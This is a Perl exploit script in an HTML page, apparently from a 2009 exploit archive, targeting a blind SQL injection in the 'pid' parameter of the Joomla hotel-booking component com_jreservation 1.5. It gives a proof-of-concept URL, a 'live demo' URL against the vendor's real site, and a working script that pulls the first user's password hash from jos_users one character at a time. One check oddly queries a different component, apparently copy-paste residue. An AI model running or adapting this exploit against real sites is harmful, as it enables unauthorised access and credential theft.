<html><head><title>Joomla Component com_jreservation 1.5 (pid) Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl -w

#---------------------------------------------------------------------------------
#joomla component com_jreservation (pid) Blind SQL Injection Vulnerability
#---------------------------------------------------------------------------------

#Author         : Chip D3 Bi0s
#Group          : LatiHackTeam
#Email          : chipdebios[alt+64]gmail.com
#Date           : 17 September 2009
#Critical Lvl   : Moderate
#Impact	       : Exposure of sensitive information
#Where	       : From Remote
#---------------------------------------------------------------------------

#Affected software description:
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

#Application   : JReservation Hotel Booking Component
#version       : 1.5
#Developer     : Can &amp; Will
#License       : GPL            type  : Commercial
#Date Added    : 15 September 2009
#Demo          : http://jforjoomla.com/cd-hotel
#Download      : http://www.jforjoomla.com/Download-document.html?gid=47 
#Description   :

#Joomla 1.5 Jreservation Component for hotel booking system.
#Jreservation is a specially designed component for hotel owners who provides lodging
#facility &amp; online booking for the rooms like deluxe, Air conditioned, Non Air conditioned.
#By using this Joomla 1.5 Jreservation component you can add multiple room types, amenity 
#types like room amenity or property amenity. Amenity are like additional services which the
#hotel owner provides with the room e.g. Telephone, internet connection, cable connection and
#property amenity like swimming pool, gym, etc. With the help of a calender the user or a 
#customer of the hotel can check rooms availability also book room as a provisional booking.

#---------------------------------------------------------------------------


#I.Blind SQL injection (pid)
#Poc/Exploit:
#~~~~~~~~~~~

#http://127.0.0.1/[path]/index.php?option=com_jreservation&amp;task=propertycpanel&amp;pid=X[blind]
#X: Valid pip


#Demo Live:
#~~~~~~~~~
#http://www.jforjoomla.com/cd-hotel/index.php?option=com_jreservation&amp;task=propertycpanel&amp;pid=1+and+1=1
#etc, etc...

#+++++++++++++++++++++++++++++++++++++++
#[!] Produced in South America
#+++++++++++++++++++++++++++++++++++++++


use LWP::UserAgent;
use Benchmark;
my $t1 = new Benchmark;


print &quot;\t\t------------------------------------------------------------\n\n&quot;;
print &quot;\t\t                      |  Chip d3 Bi0s |                     \n\n&quot;;
print &quot;\t\t JReservation Hotel Booking Component                        \n\n&quot;;
print &quot;\t\t Joomla Component com_jreservation (pid) BSQL                \n\n&quot;;
print &quot;\t\t-------------------------------------------------------------\n\n&quot;;


print &quot;http://localhost/Path       : &quot;;chomp(my $target=&lt;STDIN&gt;);
print &quot; [-] Introduce pid          : &quot;;chomp($z=&lt;STDIN&gt;);
print &quot; [-] Introduce coincidencia : &quot;;chomp($w=&lt;STDIN&gt;);


$column_name=&quot;concat(password)&quot;;
$table_name=&quot;jos_users&quot;;


$b = LWP::UserAgent-&gt;new() or die &quot;Could not initialize browser\n&quot;;
$b-&gt;agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');

print &quot;----------------Inyectando----------------\n&quot;;

#es Vulnerable?
  $host = $target . &quot;/index.php?option=com_jreservation&amp;task=propertycpanel&amp;pid=&quot;.$z.&quot;+and+1=1&quot;;
  my $res = $b-&gt;request(HTTP::Request-&gt;new(GET=&gt;$host));  my $content = $res-&gt;content;  my $regexp = $w;
  if ($content =~ /$regexp/) {

$host = $target . &quot;/index.php?option=com_jlord_rss&amp;task=feed&amp;id=&quot;.$z.&quot;+and+1=2&quot;;
  my $res = $b-&gt;request(HTTP::Request-&gt;new(GET=&gt;$host));  my $content = $res-&gt;content;  my $regexp = $w;
  if ($content =~ /$regexp/) {print &quot; [-] Exploit Fallo :(\n&quot;;}

else

{print &quot; [-] Vulnerable :)\n&quot;;

for ($x=1;$x&lt;=32;$x++) 
	{

  $host = $target . &quot;/index.php?option=com_jreservation&amp;task=propertycpanel&amp;pid=&quot;.$z.&quot;+and+ascii(substring((SELECT+&quot;.$column_name.&quot;+from+&quot;.$table_name.&quot;+limit+0,1),&quot;.$x.&quot;,1))&gt;57&quot;;
  my $res = $b-&gt;request(HTTP::Request-&gt;new(GET=&gt;$host));  my $content = $res-&gt;content;  my $regexp = $w;
  print &quot; [!] &quot;;if($x &lt;= 9 ) {print &quot;0$x&quot;;}else{print $x;}#para alininear 0..9 con los 10-32

  if ($content =~ /$regexp/)
  {
  
          for ($c=97;$c&lt;=102;$c++) 

{
 $host = $target . &quot;/index.php?option=com_jreservation&amp;task=propertycpanel&amp;pid=&quot;.$z.&quot;+and+ascii(substring((SELECT+&quot;.$column_name.&quot;+from+&quot;.$table_name.&quot;+limit+0,1),&quot;.$x.&quot;,1))=&quot;.$c.&quot;&quot;;
 my $res = $b-&gt;request(HTTP::Request-&gt;new(GET=&gt;$host));
 my $content = $res-&gt;content;
 my $regexp = $w;


 if ($content =~ /$regexp/) {$char=chr($c); $caracter[$x-1]=chr($c); print &quot;-Caracter: $char\n&quot;; $c=102;}
 }


  }
else
{

for ($c=48;$c&lt;=57;$c++) 

{
 $host = $target . &quot;/index.php?option=com_jreservation&amp;task=propertycpanel&amp;pid=&quot;.$z.&quot;+and+ascii(substring((SELECT+&quot;.$column_name.&quot;+from+&quot;.$table_name.&quot;+limit+0,1),&quot;.$x.&quot;,1))=&quot;.$c.&quot;&quot;;
 my $res = $b-&gt;request(HTTP::Request-&gt;new(GET=&gt;$host));
 my $content = $res-&gt;content;
 my $regexp = $w;

 if ($content =~ /$regexp/) {$char=chr($c); $caracter[$x-1]=chr($c); print &quot;-Caracter: $char\n&quot;; $c=57;}
 }


}

	}
print &quot; [+] Password   :&quot;.&quot; &quot;.join('', @caracter) . &quot;\n&quot;;
my $t2 = new Benchmark;
my $tt = timediff($t2, $t1);
print &quot;El script tomo:&quot;,timestr($tt),&quot;\n&quot;;

}
}

else

{print &quot; [-] Exploit Fallo :(\n&quot;;}

# milw0rm.com [2009-09-17]</pre></html>